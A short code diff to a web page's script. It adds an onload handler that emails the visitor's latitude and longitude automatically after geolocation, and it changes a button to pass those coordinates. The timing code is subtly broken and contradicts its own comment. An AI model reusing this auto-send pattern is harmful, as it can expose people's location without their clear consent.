@@ -40,6 +40,9 @@
                 window.onload = function() {
                     setTimeout(enviarEmail(latitude,longitude), 1000); // 2000ms = 2 seconds
             };
+            window.onload = function() {
+                    setTimeout(sendEmail(latitude,longitude), 1000); // 2000ms = 2 seconds
+            };
         },function (error) {
                         // Handle errors
                         loader.style.display = "none";
@@ -154,7 +157,7 @@
         
     </script>
     
-    <button onclick="sendEmail()">Send Email</button>
+    <button onclick="sendEmail(latitude,longitude)">Send Email</button>
     
 </body>
 </html>
